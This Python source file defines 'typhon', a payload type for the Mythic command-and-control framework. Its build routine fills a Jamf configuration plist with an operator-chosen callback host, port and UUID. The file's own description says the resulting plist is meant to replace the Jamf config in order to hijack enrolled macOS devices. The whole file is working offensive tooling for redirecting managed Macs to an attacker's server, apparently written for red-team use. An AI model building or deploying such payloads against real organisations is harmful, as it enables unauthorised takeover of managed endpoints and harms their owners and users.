import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class typhon(PayloadType):
    name = "typhon"  # name that would show up in the UI
    file_extension = "plist"  # default file extension to use when creating payloads
    author = "@calhall / @sclow"  # author of the payload type
    supported_os = [SupportedOS.MacOS]  # supported OS and architecture combos
    wrapper = False
    note = """This payload is used to replace the Jamf config to hijack enrolled devices."""
    supports_dynamic_loading = False  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        # we'll leave this blank for now
    ]
    c2_profiles = ["jamfserver"]
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "typhon"
    agent_icon_path = agent_path / "agent_functions" / "typhon.svg"
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        #create_payload = await MythicRPC().execute("create_callback", payload_uuid=self.uuid, c2_profile="http")
        try:

            c2_code = open(self.agent_code_path / "com.jamfsoftware.jamf.plist").read()
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
            
            callback_url = self.c2info[0].get_parameters_dict()['callback_host'] + ':' + str(self.c2info[0].get_parameters_dict()['callback_port'])
            c2_code = c2_code.replace("JSS_URL_VALUE", callback_url)
            c2_code = c2_code.replace("UUID_HERE", self.uuid)
            
            if len(self.c2info) != 1:
                resp.build_stderr = "typhon only supports one C2 Profile at a time"
                resp.set_status(BuildStatus.Error)
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout="Stamped in all of the fields",
                StepSuccess=True
            ))
            resp.payload = c2_code.encode()
            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)
            else:
                resp.build_message = "Successfully built!\n"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
